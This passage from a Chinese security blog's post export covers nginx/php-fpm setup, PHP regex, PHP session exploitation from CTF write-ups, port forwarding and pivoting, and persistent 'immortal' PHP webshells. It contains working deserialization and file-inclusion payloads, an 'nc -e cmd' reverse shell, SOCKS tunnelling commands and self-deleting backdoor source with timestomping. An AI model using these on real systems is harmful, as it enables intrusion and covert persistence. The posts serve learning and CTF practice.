配置php-fpm修改配置监听9000端口来处理nginx的请求(这种方法一般在windows上使用),另一种方法linux下使用sock方法速度会更快，这个地方也可以不修改，真使用里面 /run/php/php7.2-fpm.sock 这样的路径，后面nginx也要设置成这种格式 fastcgi_pass unix:/run/php/php7.2-fpm.sock; nginx打开nginx的配置文件 /etc/nginx/sites-available/default (也可以自己在其它地方添加配置文件,这个地方是默认的配置地方) 12345678910111213141516171819server &#123; listen 80; #监听80端口，接收http请求 server_name www.example.com; #就是网站地址 root /usr/local/etc/nginx/www/huxintong_admin; # 准备存放代码工程的路径 #路由到网站根目录www.example.com时候的处理 location / &#123; index index.php; #跳转到www.example.com/index.php autoindex on; &#125; #当请求网站下php文件的时候，反向代理到php-fpm location ~ \\.php$ &#123; fastcgi_split_path_info ^(.+\\.php)(/.+)$; #fastcgi_pass 127.0.0.1:9000;#nginx fastcgi进程监听的IP地址和端口 fastcgi_pass unix:/run/php/php7.2-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125; 参考文章： CGI、FastCGI和PHP-FPM关系详解","categories":[],"tags":[],"author":"ye1s"},{"title":"PHP 正则表达式","slug":"PHP-正则表达式","date":"2020-08-26T05:31:00.000Z","updated":"2020-08-26T09:40:29.960Z","comments":true,"path":"article/8c32e2a6.html","link":"","permalink":"https://blog.cfyqy.com/article/8c32e2a6.html","excerpt":"正则表达式允许用户通过使用某种特殊字符构建匹配模式，然后把匹配模式与文件中的数据、程序输入或者Web页面的表单输入等目标对象进行比较，根据这些输入中是否包含匹配模式，来执行相应的程序。","text":"正则表达式允许用户通过使用某种特殊字符构建匹配模式，然后把匹配模式与文件中的数据、程序输入或者Web页面的表单输入等目标对象进行比较，根据这些输入中是否包含匹配模式，来执行相应的程序。 目前有两种不同规范的正则表达式： POSIX规范：在兼容 POSIX 的 UNIX 系统上，grep 和 egrep 之类的工具都遵循 POSIX 规范，一些数据库系统中的正则表达式也匹配 POSIX 规范。 PCRE 规范：为 Perl Compatible Regular Expressions 的缩写，中文即 Perl 兼容正则表达式，由 Philip Hazel 开发的 Perl 库，为很多现代工具所使用，大多数编程语言的正则表达式也都是集成该规范。 针对两种不同的正则表达式规范，PHP 提供了两组不同的函数库，分别为 POSIX Regex扩展库和PCRE扩展库，每个库对应特定的表达式。 从PHP5.3.0开始，POSIX Regex 扩展将被废弃，所有调用本扩展中函数都将提示 E_DEPRECATED 错误 下面就对 PCRE 正则语法进行学习 PCRE 正则语法分隔符当使用 PCRE 函数的时候，模式需要由分隔符闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。经常使用的分隔符是正斜线(/)、hash符号(#) 以及取反符号(~)。 1234/foo bar/#^[^0-9]$#+php+%[a-zA-Z0-9_-]% 如果分隔符需要在模式内进行匹配，它必须使用反斜线进行转义。 原子原子是正则表达式的最基本的组成单位，而且必须至少包含一个原子。常见的有： 12345678. 匹配除「\\r」「\\n」之外的任何单个字符\\d 匹配任意一个十进制数字\\D 匹配任意一个非十进制字符\\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \\f\\n\\r\\t\\v]。注意Unicode正则表达式会匹配全角空格符。 \\S 匹配任何非空白字符 \\w 匹配包括下划线的任何单词字符。等价于「[A-Za-z0-9_]」,注意Unicode正则表达式会匹配中文字符 \\W 匹配任何非单词字符。等价于「[^A-Za-z0-9_]」 [^] 作为一个原子，不能匹配[]之间的一个原子 元字符元字符用来修饰原子的字符，不可以单独出现。 123456789101112131415161718&#x2F;&#x2F;量词 &#123;n&#125; n是一个非负整数。匹配原子n次&#123;n,&#125; 至少匹配原子n次 &#123;n,m&#125; 其中n&lt;&#x3D;m。最少匹配n次且最多匹配m次。* ：匹配其左边的子表达式0次或多次+ ：匹配其左边的子表达式1次或多次? ：匹配其左边的子表达式0次或1次&#x2F;&#x2F;边界限制^ ：匹配指定字符串开头的字符串$ ：匹配指定字符串结尾的字符串&#x2F;&#x2F;模式选择符[] ：匹配指定范围内的单个字符，代替指定字符| ：在多项之间选择一个进行匹配&#x2F;&#x2F;模式单元() ：标记子表达式的开始和结束位置 模式修正符123456i 大小写不敏感匹配。m 支持多行匹配 s 模式中的点号元字符匹配所有字符，包含换行符x 模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略 U 匹配模式变为懒惰模式 e PHP 5.5.0 移除，preg_replace() 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式) PCRE函数12345678910preg_filter — 执行一个正则表达式搜索和替换preg_grep — 返回匹配模式的数组条目preg_last_error — 返回最后一个PCRE正则执行产生的错误代码preg_match_all — 执行一个全局正则表达式匹配preg_match — 执行匹配正则表达式preg_quote — 转义正则表达式字符preg_replace_callback_array — Perform a regular expression search and replace using callbackspreg_replace_callback — 执行一个正则表达式搜索并且使用一个回调进行替换preg_replace — 执行一个正则表达式的搜索和替换preg_split — 通过一个正则表达式分隔字符串 常用正则表达式参考文章：PHP 正则表达式正则表达式","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://blog.cfyqy.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"author":"ye1s"},{"title":"PHP session 常见利用点","slug":"PHP-SESSION利用","date":"2020-08-26T01:04:00.000Z","updated":"2020-09-03T09:37:39.558Z","comments":true,"path":"article/94ba7f24.html","link":"","permalink":"https://blog.cfyqy.com/article/94ba7f24.html","excerpt":"首发于先知社区：https://xz.aliyun.com/t/8221 在做CTF的时候，经常会遇到 PHP session 的考点，就总结一下。","text":"首发于先知社区：https://xz.aliyun.com/t/8221 在做CTF的时候，经常会遇到 PHP session 的考点，就总结一下。 0x1PHP session 简介0x1.1基本概念session 概念: 一般称为会话控制。session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 session 对象。当会话过期或被放弃后，服务器将终止该会话。 PHP session概念: PHP session 是一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。 它为每个访问者创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，亦或通过 URL 进行传导。 0x1.2会话流程当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 cookie）， 如果请求中不包含会话 ID 信息，PHP 就会创建一个新的会话。 会话开始之后，PHP 就会将会话中的数据设置到 $_SESSION 变量中。 当 PHP 停止的时候，它会自动读取 $_SESSION 中的内容，并将其进行序列化， 然后发送给会话保存管理器来进行保存。 默认情况下，PHP 使用内置的文件会话保存管理器（files）来完成会话的保存。 也可以通过配置项 session.save_handler 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。 可以通过调用函数 session_start() 来手动开始一个会话。 如果配置项 session.auto_start 设置为1， 那么请求开始的时候，会话会自动开始。 PHP 脚本执行完毕之后，会话会自动关闭。 同时，也可以通过调用函数 session_write_close() 来手动关闭会话。 0x1.3常见配置在 PHP 的安装目录下面找到 php.ini 文件，这个文件主要的作用是对 PHP 进行一些配置 12345678910111213session.save_handler = files #session的存储方式session.save_path = \"/var/lib/php/session\" #session id存放路径session.use_cookies= 1 #使用cookies在客户端保存会话session.use_only_cookies = 1 #去保护URL中传送session id的用户session.name = PHPSESSID #session名称（默认PHPSESSID）session.auto_start = 0 #不启用请求自动初始化sessionsession.use_trans_sid = 0 #如果客户端禁用了cookie，可以通过设置session.use_trans_sid来使标识的交互方式从cookie变为url传递session.cookie_lifetime = 0 #cookie存活时间（0为直至浏览器重启，单位秒）session.cookie_path = / #cookie的有效路径session.cookie_domain = #cookie的有效域名session.cookie_httponly = #httponly标记增加到cookie上(脚本语言无法抓取)session.serialize_handler = php #PHP标准序列化session.gc_maxlifetime =1440 #过期时间(默认24分钟，单位秒) 0x1.4存储引擎PHP 中的 session 中的内容默认是以文件的方式来存储的，存储方式就是由配置项session.save_handler 来进行确定的，默认是以文件的方式存储。存储的文件是以 sess_PHPSESSID 来进行命名的，文件的内容就是 session 值的序列话之后的内容。 session.serialize_handler 是用来设置 session 的序列话引擎的，除了默认的 PHP 引擎之外，还存在其他引擎，不同的引擎所对应的 session 的存储方式不相同。 session.serialize_handler 有如下三种取值 存储引擎 存储方式 php_binary 键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php 键名+竖线+经过serialize()函数序列处理的值 php_serialize (PHP&gt;5.5.4)经过serialize()函数序列化处理的数组 在 PHP 中默认使用的是 PHP 引擎，如果要修改为其他的引擎，只需要添加代码ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;),示例代码如下： 1234&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();// do something 以如下代码为例，查看不同存储引擎存储的结果 123456&lt;?phperror_reporting(0);ini_set('session.serialize_handler','php_binary');//这里换不同的存储引擎session_start();$_SESSION['username'] = $_GET['username'];?&gt; php_binaryphpphp_serialize 0x2PHP session 利用0x2.1反序列化当网站序列化存储 session 与反序列化读取 session 的方式不同时，就可能导致 session 反序列化漏洞的产生。 一般都是以 php_serialize 序列化存储 session， 以 PHP 反序列化读取 session，造成反序列化攻击。 0x2.1.1 有$_SESSION赋值例子s1.php 12345&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();$_SESSION[\"username\"]=$_GET[\"u\"];?&gt; s2.php 123456789&lt;?phpsession_start();class session &#123; var $var; function __destruct() &#123; eval($this-&gt;var); &#125;&#125;?&gt; s1.php 使用的是 php_serialize 存储引擎，s2.php 使用的是 php 存储引擎(页面中没有设置存储引擎，默认使用的是 php.ini 中 session.serialize_handler 设置的值，默认为 php) 我们可以往s1.php传入如下的参数 1s1.php?u&#x3D;|O:7:&quot;session&quot;:1:&#123;s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;&#125; 此时使用的是 php_seriallize 存储引擎来序列化，存储的内容为接着访问s2.php,使用的是 php 存储引擎来反序列化，结果这是因为当使用 php 引擎的时候，php 引擎会以 | 作为作为 key 和 value 的分隔符，那么就会将a:1:{s:8:&quot;username&quot;;s:47:&quot;作为 session 的 key，将O:7:&quot;session&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}&quot;;}作为 value，然后进行反序列化。 访问s2.php为什么会反序列化？这里可以可以看看官方文档 那串 value 不符合”正常”的被反序列化的字符串规则不会报错吗？这里提到一个unserialize 的特性，在执行 unserialize 的时候，如果字符串前面满足了可被反序列化的规则即后续的不规则字符会被忽略。 0x2.1.2 无$_SESSION赋值上面的例子直接可以给 $_SESSION 赋值,那当代码中不存在给 $_SESSION 赋值的时候，又该如何处理？查看官方文档，可知还存在 PHP 还存在一个 upload_process 机制，可以在$_SESSION中创建一个键值对，其中的值可以控制。 以 Jarvis OJ 平台的PHPINFO题目为例环境地址：http://web.jarvisoj.com:32784/ index.php 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 存在 phpinfo.php 文件,由此可知 session.upload_progress.enabled 为 On，session.serialize_handler 为 php_serialize，与 index.php 页面所用的 PHP 存储引擎不同，存在反序列化攻击。session.upload_progress.name 为 PHP_SESSION_UPLOAD_PROGRESS，可以本地创建form.html，一个向 index.php 提交 POST 请求的表单文件，其中包括PHP_SESSION_UPLOAD_PROGRESS 变量。 form.html 12345&lt;form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; 使用 bp 抓包,在 PHP_SESSION_UPLOAD_PROGRESS 的 value 值123后面添加 | 和序列化的字符串 查看根目录文件查看根目录路径读取 flag 0x2.2文件包含利用条件： 存在文件包含，session 文件的路径已知，且文件中的内容可控。session 文件的路径可从 phpinfo 中得知，或者进行猜测 1234&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSIONID&#x2F;var&#x2F;lib&#x2F;php[\\d]&#x2F;sessions&#x2F;sess_PHPSESSIONID&#x2F;tmp&#x2F;sess_PHPSESSID&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID 例子1：session.php 1234&lt;?php session_start(); $_SESSION[\"username\"]=$_GET['s'];?&gt; include.php 123&lt;?phpinclude $_GET['i'];?&gt; 往 session.php 传入一句话，写入 session 文件中 1session.php?s&#x3D;&lt;?php phpinfo(); ?&gt; 在 cookie 中 PHPSESSID 值为 k82hb2gbrj7daoncpogvlbrbcp，即 session 存储的文件名为 sess_k82hb2gbrj7daoncpogvlbrbcp,路径可以猜测一下，这里为 /var/lib/php/sessions/include.php 文件包含 session 存储文件 1&#x2F;include.php?i&#x3D;&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_k82hb2gbrj7daoncpogvlbrbcp 例子2：XCTF2018-Final_bestphp这里就取其中的小部分代码，稍微修改如下bestphp.php 12345678910111213141516&lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set('open_basedir', '/var/www/html:/tmp');$func=isset($_GET['function'])?$_GET['function']:'filters';call_user_func($func,$_GET);if(isset($_GET['file']))&#123; include $_GET['file'];&#125;session_start();$_SESSION['name']=$_POST['name'];?&gt; 这里设置了 open_basedir，限制了我们读取文件的范围,这里 session 文件是保存在 /var/lib/php/session/ 下，不在读取的范围里，这里可以考虑修改一下 session 文件存储的位置。 session_start()函数从 PHP7 开始增加了 options 参数，会覆盖 php.ini 中的配置。 利用 session_start 覆盖 php.ini 文件中的默认配置 session.save_path 的值，并写入 12http://192.168.1.101/bestphp.php/?function=session_start&amp;save_path=/var/www/html post: name=&lt;?=phpinfo();?&gt; 成功包含session文件其实这个操作也可以由 session_save_path() 函数来完成，但是这个函数传入的参数是个字符串，不适用于此题。 0x2.3用户伪造利用条件：知道所使用的 PHP session 存储引擎，以及 session 文件内容可控。 这里就以2020虎符杯-babyupload为例index.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 &lt;?phperror_reporting(0);session_save_path(\"/var/babyctf/\");session_start();require_once \"/flag\";highlight_file(__FILE__);if($_SESSION['username'] ==='admin')&#123; $filename='/var/babyctf/success.txt'; if(file_exists($filename))&#123; safe_delete($filename); die($flag); &#125;&#125;else&#123; $_SESSION['username'] ='guest';&#125;$direction = filter_input(INPUT_POST, 'direction');$attr = filter_input(INPUT_POST, 'attr');$dir_path = \"/var/babyctf/\".$attr;if($attr===\"private\")&#123; $dir_path .= \"/\".$_SESSION['username'];&#125;if($direction === \"upload\")&#123; try&#123; if(!is_uploaded_file($_FILES['up_file']['tmp_name']))&#123; throw new RuntimeException('invalid upload'); &#125; $file_path = $dir_path.\"/\".$_FILES['up_file']['name']; $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']); if(preg_match('/(../|..\\\\)/', $file_path))&#123; throw new RuntimeException('invalid file path'); &#125; @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path))&#123; $upload_result = \"uploaded\"; &#125;else&#123; throw new RuntimeException('error while saving'); &#125; &#125; catch (RuntimeException $e) &#123; $upload_result = $e-&gt;getMessage(); &#125;&#125; elseif ($direction === \"download\") &#123; try&#123; $filename = basename(filter_input(INPUT_POST, 'filename')); $file_path = $dir_path.\"/\".$filename; if(preg_match('/(../|..\\\\)/', $file_path))&#123; throw new RuntimeException('invalid file path'); &#125; if(!file_exists($file_path)) &#123; throw new RuntimeException('file not exist'); &#125; header('Content-Type: application/force-download'); header('Content-Length: '.filesize($file_path)); header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"'); if(readfile($file_path))&#123; $download_result = \"downloaded\"; &#125;else&#123; throw new RuntimeException('error while saving'); &#125; &#125; catch (RuntimeException $e) &#123; $download_result = $e-&gt;getMessage(); &#125; exit;&#125;?&gt; 这是一个存在上传和下载文件的功能的文件，只有当$_SESSION[&#39;username&#39;] ===&#39;admin&#39; 才能获取 flag。 我们可以通过下载查看 session 文件所使用的存储引擎，然后通过相同的存储引擎伪造为 admin，上传 session 文件 ，获取 flag。 首先下载 session 文件，文件名为 sess_PHPSESSID 123http://192.168.100.16/index.php post:direction=download&amp;filename=sess_qq7ucpov7ulvt1qsji3pueea2i 可知使用的是 php_binary 。内容为： 1&lt;0x08&gt;usernames:5:&quot;guest&quot;; 猜测我们只要上传一个 session 文件内容为： 1&lt;0x08&gt;usernames:5:&quot;admin&quot;; 发现如果不上传 attr 参数，dir_path会直接拼接上传的文件名+&quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]); 如果把上传文件名设置为 sess，并且不传递 attr 参数，就可以得到/var/babyctf/sess_XXXXXXXXX，这就可以当成 session 文件。hash_file()是根据文件内容得到的 hash 值本地创建一个文件名为sess:上传 sess 文件计算 hash 值文件名为 sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4,尝试下载访问，如下可知已经上传成功。现在就差 success.txt， 可以把 attr 参数设置为 success.txt将success.txt变成一个目录,从而绕过了限制。然后将 PHPSESSID 修改为432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4,就可以得到flag 0x3总结这里对PHP session 常见的利用点进行一次汇总，当然肯定还有其他利用方式，等自己以后遇到再补充吧。 0x4参考https://www.w3school.com.cn/php/php_sessions.asphttps://www.cnblogs.com/st-leslie/p/8016951.htmlhttps://www.php.net/manual/zh/book.session.phphttps://blog.spoock.com/2016/10/16/php-serialize-problem/https://cloud.tencent.com/developer/article/1487037https://zhuanlan.zhihu.com/p/90879209https://www.mi1k7ea.com/2019/04/21/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/https://zhuanlan.zhihu.com/p/90879209https://xz.aliyun.com/t/4265https://xz.aliyun.com/t/6640","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"PHP session","slug":"PHP-session","permalink":"https://blog.cfyqy.com/tags/PHP-session/"}],"author":"ye1s"},{"title":"web 缓存投毒","slug":"web-缓存投毒","date":"2020-08-20T12:32:01.000Z","updated":"2020-08-23T12:58:14.839Z","comments":true,"path":"article/94ba7f2d.html","link":"","permalink":"https://blog.cfyqy.com/article/94ba7f2d.html","excerpt":"Web缓存投毒的目的是发送导致有害响应的请求，将该响应将保存在缓存服务中并提供给其他用户。","text":"Web缓存投毒的目的是发送导致有害响应的请求，将该响应将保存在缓存服务中并提供给其他用户。 参考文章:BlackHat2020议题之Web缓存投毒实战Web缓存投毒Web缓存利用分析(一)Web缓存利用分析(二)Web缓存利用分析(三)","categories":[],"tags":[],"author":"ye1s"},{"title":"端口转发与代理","slug":"内网端口转发","date":"2020-08-17T15:58:00.000Z","updated":"2020-08-19T13:36:56.891Z","comments":true,"path":"article/8b7d2d82.html","link":"","permalink":"https://blog.cfyqy.com/article/8b7d2d82.html","excerpt":"端口转发、代理","text":"端口转发、代理 基本概念端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为。 端口映射是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。 实际应用中需要考虑两种情况： Client-&gt;Transit server-&gt;Server：Client能够正向连接Transit server。Transit server直接转发即可 Client&lt;-Transit server-&gt;Server：Client无法正向连接Transit server，但Transit server能够反向连接Client。 如果Client要对Server的多个端口进行扫描(或是多个Server的多个端口)，逐个配置转发规则很不现实。为了提高效率，这里可以使用代理，配置一次规则即可。 端口转发正向和反向连接： 正向连接：你的机器连接目标机器 反向连接：目标机器反连你的机器 将本地的端口转发到服务器上 ncServer: 1nc -lvp 4444 Client: 1nc -e cmd server_ip 4444 ew1ew_for_win_32.exe -s lcx_tran -l client_port -f server_ip -g server_port 端口映射如果内网机器防火墙禁止3389出站，可以使用tran命令将3389端口映射到其他端口上内网机器上执行命令：lcx.exe -tran 映射端口 连接IP 连接端口 1lcx.exe -tran 66 192.168.183.168 3389 代理代理类型： HTTP代理 SOCKS代理 FTP代理 Telnet代理 SSL代理 正向代理正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端。比如vpn，国内不能直接访问谷歌，可是代理服务器可以访问，客户端可以将数据转发到代理服务器，再由代理服务器转发给谷歌获取到数据，再返回客户端。这里代理的是客户端。 1Client --&gt; Proxy &lt;--&gt; Server 反向代理反向代理即是服务器端代理，代理服务器，客户端不知道实际提供服务的服务器。比如nginx，客户端访问想要服务器的8080端口，可是服务器的8080端口不对外开发，这里通过nginx代理端口，将所有访问80端口的流量都转发到8080端口，这样客户端只需要访问80端口就相当于访问了服务器的8080端口。这里代理的是服务器。 1Client &lt;--&gt; Proxy &lt;-- Server EWEW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。工具包中提供了多种可执行文件，支持Linux、Windows、MacOS、Arm-Linux 多种平台。 作者已经撤销给项目了。下载地址： 链接：https://pan.baidu.com/s/1Fpmx6nbvt5FlIpJPNwS7QA提取码：ye1s 其中SOCKS5服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。 ssocksd 用来开启Socks5代理服务 rssocks 本地启用Socks5服务，并反弹到另一IP地址 rcsocks 接收反弹过来的Socks5服务，并转向另一端口 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。lcx 类别管道： lcx_slave，lcx_listen：端口转发 lcx_tran：端口映射 123456789101112lcx_slave： 该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。lcx_tran： 该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。lcx_listen： 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试``` 工具参数说明：```bash -l 开放指定端口监听 -d 指定转发或反弹的主机地址 -e 指定转发或反弹的主机端口 -f 指定连接或映射的主机地址 -g 指定连接或映射的主机端口 -t 设置超时时间 普通网络环境 网络拓扑: 正向代理 当目标网络(Server)边界存在公网IP且可任意开监听端口时 1ew_for_Win.exe -s ssocksd -l 1080 在Server上通过该命令开启 1080 端口的 socks 代理 其他主机可以通过设置代理为目标IP:1080添加代理，Windows可以使用SocksCap64，我这里是Kali直接修改/etc/proxychains.conf设置代理为目标网络，使用proxychains命令扫描3389端口 反向代理 反向socks5当目标网络边界(Client)不存在公网 IP，需要通过反弹方式创建socks代理在具有公网IP的Server上执行以下命令： 1ew_for_Win.exe -s rcsocks -l 1080 -e 8888 在公网主机中添加转接隧道，将1080收到的代理请求转交给反连8888端口的主机 在Client主机上开启socks代理，并反弹到公网的8888端口 1ew_for_Win.exe -s rssocks -d 10.19.11.138 -e 8888 Kali通过访问公网主机的1080端口提供的socks5代理服务来访问目标内网 数据流向：Kali -&gt; 1080 -&gt; Server -&gt; 8888 | 防火墙 | &lt;- Clien 二级网络环境环境一网络环境拓扑：在A主机上开启端口为8888的socks代理 1ew_for_Win.exe -s ssocksd -l 8888 在B主机上将1080端口收到的socks代理请求转发给A主机的8888端口 1ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.44.128 -g 8888 Kali通过访问B主机的1080端口提供的socks5代理服务来访问主机A数据流向：Kali -&gt; 1080 -&gt; Server B -&gt; 8888 -&gt; Server A 环境二网络环境拓扑： 在VPS上添加转接隧道，将1080收到的代理请求转交给反连8888端口的主机 1ew_for_Win.exe -s lcx_listen -l 1080 -e 8888 在A主机上开启端口为9999的socks代理 1ew_for_Win.exe -s ssocksd -l 9999 在B主机上利用工具的lcx_slave方式，打通主机A和VPS之间的通讯隧道当代理成功时，返回VPS可以看到有rssocks cmd_socket OK! 的提示 1ew_for_Win.exe -s lcx_slave -d 10.19.11.138 -e 8888 -f 192.168.44.128 -g 9999 Kali通过访问VPS的1080端口提供的socks5代理服务来访问Server A 数据流向：Kali -&gt; 1080 -&gt; VPS -&gt; 8888 | 防火墙 | -&gt; B -&gt; 9999 -&gt; A SSH隧道12345678910ssh参数详解： -C Enable compression 压缩数据传输 -q Quiet mode. 安静模式 -T Disable pseudo-tty allocation. 不占用 shell -f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数 -N Do not execute a remote command. 不执行远程命令，端口转发就用它 -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. -D port 指定一个本地机器动态的应用程序端口转发. -g port 允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接 本地转发语法格式： 1ssh -L [local_bind_addr:]local_port:remote:remote_port middle_host 远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到1234端口。 1ssh -CfNg -L 2222:127.0.0.1:3306 root@139.196.xx.xx 工作原理：在本地指定一个由ssh监听的转发端口2222，将远程主机的3306端口(127.0.0.1:3306)映射到本地的2222端口，当有主机连接本地映射的2222端口时，本地ssh就将此端口的数据包转发给中间主机VPS，然后VPS再与远程主机端口(127.0.0.1:3306)通信。数据流向：Kali -&gt; 2222 -&gt; VPS -&gt; 127.0.0.1:3306 远程转发语法格式： 1ssh -R [bind_addr:]remote1_port:host:port remote1 假设kali开了一个80端口的web服务，外网无法访问，使用远程转发，将kali的80端口转发到外网的其他端口，这时候访问外网的端口，就访问到了内网的端口。 1ssh -CfNg -R 4444:127.0.0.1:80 root@192.168.183.195 此时在192.168.183.195这台主机上访问127.0.0.1:4444端口即可访问到kali的80端口 动态转发本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，不同的服务就要建立不同的端口，工作很是繁琐，而动态转发只需绑定一个本地端口，而目标端口是根据你发起的请求决定的，比如请求为445端口，通过ssh转发的请求也是445端口。 语法格式： 1ssh -D [bind_addr:]port remote 这里举一个最简单的列子：翻墙。国内正常情况下上不了Google，我们可以通过将流量转发到国外的vps上这样就可以正常访问了。在本地执行以下命令，并查看建立连接情况 1ssh -Nfg -D 3333 root@45.77.xx.xx 连接建立成功，设置浏览器到本地主机的3333端口参考文章：内网端口转发及穿透渗透基础——端口转发与代理内网渗透之端口转发、映射、代理内网穿透及端口转发大合集","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"端口转发","slug":"端口转发","permalink":"https://blog.cfyqy.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"}],"author":"ye1s"},{"title":"不死马","slug":"不死马","date":"2020-08-17T09:48:12.000Z","updated":"2021-01-05T03:12:47.910Z","comments":true,"path":"article/e94eeb06.html","link":"","permalink":"https://blog.cfyqy.com/article/e94eeb06.html","excerpt":"内存马，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。","text":"内存马，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。 生成过程不死马.php → 上传到server → server执行文件 → server本地无限循环生成 (一句话.php) 不死马网上版本网上流传的不死马 123456789101112&lt;?phpignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = '.2.php';$code = '&lt;?php if(md5($_GET[\"pass\"])==\"6a3421c28b49c8ee256ea53ef57b6acf\")&#123;@eval($_POST[a]);&#125; ?&gt;';while (1)&#123; file_put_contents($file,$code); system('touch -m -d \"2018-12-01 09:10:12\" .2.php'); usleep(5000);&#125;?&gt; ignore_user_abort(true):函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit():函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 unlink(__FILE__):删除文件本身，以起到隐蔽自身的作用。 while:循环内每隔usleep(5000)即写新的后门文件 system():执行的命令用于修改文件的创建或修改时间，可以绕过“find –name &#39;*.php&#39; –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。 升级版123456789101112&lt;?php ignore_user_abort(true); set_time_limit(0); $file = 'c.php'; $code = base64_decode('PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+'); while(true) &#123; if(md5(file_get_contents($file))!==md5($code)) &#123; file_put_contents($file, $code); &#125; usleep(50); &#125;?&gt; 杀死不死马 建立一个和不死马一样名字的文件夹，这样不死马就写不进去了。完全杀死不死马，得清理内存。 1rm -rf .2.php | mkdir .2.php 杀进程得在root或者www-data权限下。如上传一句话，然后执行 system(‘kill -9 -1’); 杀死所有进程，在手动删除木马 12shell.php: &lt;?php @eval($_GET['9415']); ?&gt;url访问：shell.php?9415=system('kill -9 -1'); 用一个脚本竞争写入，脚本同不死马，usleep要低于对方不死马设置的值.top 查看占用率最高的cpu进程q 退出M 根据驻留内存大小进行排序P 根据CPU使用百分比大小进行排序 1234567&lt;?php while (1) &#123; $pid = 不死⻢的进程PID; @unlink(\"c.php\"); 